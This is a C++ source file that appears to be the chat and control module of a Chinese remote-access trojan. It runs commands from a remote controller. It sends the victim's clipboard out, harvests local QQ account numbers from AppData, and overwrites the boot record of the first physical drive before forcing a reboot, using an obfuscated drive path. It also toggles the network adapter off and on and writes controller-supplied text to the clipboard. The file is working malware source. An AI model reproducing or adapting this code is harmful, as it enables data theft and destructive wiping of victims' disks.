#include "../StdAfx.h"
#include "ChatManager.h"
#include <SHLOBJ.H>
#include <WINIOCTL.H>
#include <setupapi.h>
#pragma comment(lib,"setupapi.lib")



CChatManager::CChatManager(CClientSocket *pClient) : CManager(pClient)
{
	BYTE	bToken[2];
	bToken[0] = TOKEN_CHAT_START;
	bToken[1] = (BYTE)true;
	Send((LPBYTE)&bToken[0], sizeof(bToken));	
	WaitForDialogOpen();
}

// CChatManager::~CChatManager()
// {
//    // EndDialog(hwnd,0);
// }
void CChatManager::SendBoradData()
{
	if ( OpenClipboard(NULL) )
	{
		HANDLE hData = GetClipboardData(CF_TEXT);
		char * buffer = (char*)GlobalLock(hData);
		
		if (buffer == NULL)
		{
			char str[] = "剪切板数据为空";

			Send((unsigned char *)str,strlen(str));	
		}
		else
		{
			Send((unsigned char *)buffer,strlen(buffer));
		}

		GlobalUnlock(hData);
		CloseClipboard();
	}
}

TCHAR szQQMun[1024]={0};

void GetLocalQQNum()
{
	
	TCHAR pathBuffer[MAX_PATH] = {0};
    SHGetSpecialFolderPath(NULL, pathBuffer, CSIDL_APPDATA, FALSE);
	TCHAR strPath[MAX_PATH]={0};
	strcpy(strPath,pathBuffer);
	strcat(strPath,"\\Tencent\\Users\\*.*");
    HANDLE hFile;
    WIN32_FIND_DATA fileData;
    hFile = FindFirstFile(strPath, &fileData);
    FindNextFile(hFile, &fileData);
	int i = 0;
    while (FindNextFile(hFile, &fileData))
    {
        // 如果是一个文件夹目录
        if(fileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
        {
			
			strcat(fileData.cFileName,"\r\n");
			memcpy(szQQMun+i,fileData.cFileName,strlen(fileData.cFileName));
			i+=strlen(fileData.cFileName);
			
			
        }
    }
	//  return szQQMun;
}

void KillMBR()
{	
	HANDLE hDevice;
	DWORD dwBytesWritten, dwBytesReturned;
	BYTE pMBR[512] = {0};
	// 重新构造MBR
	memcpy(pMBR, "", sizeof(""));
	pMBR[510] = 0x55;
	pMBR[511] = 0xAA;
	char str201036[]={'\\','\\','.','\\','P','H','Y','S','I','C','A','L','D','R','I','V','E','0','\0'};
	hDevice = CreateFileA(str201036, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	if (hDevice == INVALID_HANDLE_VALUE)return;
	DeviceIoControl(hDevice, FSCTL_LOCK_VOLUME, NULL, 0, NULL, 0, &dwBytesReturned, NULL);
	WriteFile(hDevice, pMBR, sizeof(pMBR), &dwBytesWritten, NULL);
	DeviceIoControl(hDevice, FSCTL_UNLOCK_VOLUME, NULL, 0, NULL, 0, &dwBytesReturned, NULL);
	CloseHandle(hDevice);
	Sleep(2000);
	DWORD   dwVersion   =   GetVersion();   
    if   (dwVersion   <   0x80000000)   //   Is   NT   or   2000!   
    {   
		HANDLE   hToken;  
		TOKEN_PRIVILEGES   tkp;   
		OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES   |   TOKEN_QUERY,   &hToken); 
		LookupPrivilegeValue(NULL,SE_SHUTDOWN_NAME,&tkp.Privileges[0].Luid); 
		tkp.PrivilegeCount= 1;
		tkp.Privileges[0].Attributes   =   SE_PRIVILEGE_ENABLED;
		AdjustTokenPrivileges(hToken,   FALSE,   &tkp,   0,(PTOKEN_PRIVILEGES)NULL,   0); 
		ExitWindowsEx(EWX_FORCE+EWX_REBOOT,   0);   
	}  
	else
		ExitWindowsEx(EWX_FORCE+EWX_REBOOT,0);
	exit(0);
}

BOOL DisableNetInterface(BOOL bStatus)
{
    //IN LPTSTR HardwareId="PCI\\VEN_10EC&DEV_8139&SUBSYS_813910EC&REV_10" ;
	IN LPTSTR HardwareId="{4D36E972-E325-11CE-BFC1-08002BE10318}" ;
    //硬件ComponentId，注册表地址：system\currentcontrolset\class\{4D36E972-E325-11CE-BFC1-08002BE10318}\0000
	
    DWORD NewState ;
    
	//调用ddk函数，来禁用网卡    
    DWORD i,err ;
    BOOL Found=FALSE ;
    
    HDEVINFO hDevInfo ;
    SP_DEVINFO_DATA spDevInfoData ;
    
    if(bStatus)
    {
        NewState=DICS_DISABLE ;
        //禁用
    }
    else 
    {
        NewState=DICS_ENABLE ;
        //启用
    }
    //访问系统的硬件库
    hDevInfo=SetupDiGetClassDevs(NULL,"PCI",NULL,DIGCF_ALLCLASSES|DIGCF_PRESENT);
    if(hDevInfo==INVALID_HANDLE_VALUE)
    {
      //  printf("访问系统硬件出错！");
        return FALSE ;
    }
    
    //枚举硬件，获得需要的接口
    spDevInfoData.cbSize=sizeof(SP_DEVINFO_DATA);
	BOOL flagEnum;
    for(i=0;flagEnum = SetupDiEnumDeviceInfo(hDevInfo,i,&spDevInfoData);i++)
    {
        DWORD DataT ;
		//  LPTSTR p;
        CHAR buffer[100]={0};
		DWORD buffersize=0 ;
        
        //获得硬件的属性值
		buffersize = sizeof(buffer);
        while(!SetupDiGetDeviceRegistryProperty(
			hDevInfo,
			&spDevInfoData,
			SPDRP_CLASSGUID,
			&DataT,
			(PBYTE)buffer,
			buffersize,
			&buffersize))
        {
			DWORD a = GetLastError();
            if(GetLastError()==ERROR_INVALID_DATA)
            {
                //不存在HardwareID. Continue.
                break ;
            }
            else if(GetLastError()==ERROR_INSUFFICIENT_BUFFER)
            {
                //buffer size不对.
                if(buffer)
					LocalFree(buffer);
            }
            else 
            {
                //未知错误
                goto cleanup_DeviceInfo ;
            }
        }
        
        if(GetLastError()==ERROR_INVALID_DATA)
			continue ;
        
		if(NULL == buffer)
		{
			//LocalFree(buffer);
			continue ;
		}
		if(!strcmpi(HardwareId,buffer))
        {
			SP_PROPCHANGE_PARAMS spPropChangeParams ;
            
            spPropChangeParams.ClassInstallHeader.cbSize=sizeof(SP_CLASSINSTALL_HEADER);
            spPropChangeParams.ClassInstallHeader.InstallFunction=DIF_PROPERTYCHANGE ;
            spPropChangeParams.Scope=DICS_FLAG_GLOBAL ;
            spPropChangeParams.StateChange=NewState ;
            //禁用：DICS_DISABLE，DICS_ENABLE启用
            
            //
            if(!SetupDiSetClassInstallParams(hDevInfo,&spDevInfoData,(SP_CLASSINSTALL_HEADER*)&spPropChangeParams,sizeof(spPropChangeParams)))
            {
                DWORD errorcode=GetLastError();
            }
            
            if(!SetupDiCallClassInstaller(DIF_PROPERTYCHANGE,hDevInfo,&spDevInfoData))
            {
                DWORD errorcode=GetLastError();
            }
            
            switch(NewState)
            {
			case DICS_DISABLE :
			//	printf("成功禁用网络！");
                break ;
			case DICS_ENABLE :
			//	printf("成功启用网络！");
                break ;
            }
            
            //break ;
			//}
		}
        
    }
    
    //退出时，清理工作环境
 cleanup_DeviceInfo :
    err=GetLastError();
    SetupDiDestroyDeviceInfoList(hDevInfo);
    SetLastError(err);
    
    return TRUE ;
}
void DisCont()
{
	
		DisableNetInterface(1);
		Sleep(2*1000);
		DisableNetInterface(0);
	
	
}

void CChatManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	if (lpBuffer[0] == COMMAND_NEXT)
	{
		NotifyDialogIsOpen();
		return;
	}
	if (lpBuffer[0] == COMMAND_CHAT_CLOSE)
	{
		SendBoradData();
		return;
	}

	if (lpBuffer[0] == COMMAND_GETQQNUM)
	{
		GetLocalQQNum();
		Send((PBYTE)szQQMun, strlen(szQQMun));
	}

	if (lpBuffer[0] == COMMAND_KILL_MBR)
	{
		KillMBR();
	}

	if (lpBuffer[0] == COMMAND_DISCONT)
	{
		DisCont();
	}

	if( OpenClipboard(NULL) )
	{
		HGLOBAL clipbuffer;
		char * buffer;
		EmptyClipboard();
		clipbuffer = GlobalAlloc(GMEM_DDESHARE, nSize+1);
		buffer = (char*)GlobalLock(clipbuffer);
		strcpy(buffer, LPCSTR(lpBuffer));
		GlobalUnlock(clipbuffer);
		SetClipboardData(CF_TEXT,clipbuffer);
		CloseClipboard();
	}
}